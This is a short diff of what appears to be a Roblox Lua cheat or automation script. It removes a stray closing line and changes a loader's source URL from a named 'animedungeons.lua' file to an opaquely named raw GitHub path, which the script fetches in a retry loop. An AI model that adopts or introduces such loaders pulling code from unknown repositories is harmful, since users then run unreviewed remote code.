@@ -71,7 +71,6 @@ pcall(function()
 		end
 	end
 end);
-end);
 pcall(function()
 	v16.Idled:Connect(function()
 		local v799 = 0;
@@ -368,7 +367,7 @@ pcall(function()
 
     task.wait(1.5)
 
-    local sourceUrl = "https://raw.githubusercontent.com/strixzy14/white blox/refs/heads/main/animedungeons.lua"
+    local sourceUrl = "https://raw.githubusercontent.com/EpoKa59/trhgtr/main/dffg"
     for attempt = 1, 6 do
         local ok, source = pcall(function() return game:HttpGet(sourceUrl) end)
         if ok and type(source) == "string" and #source > 100 then
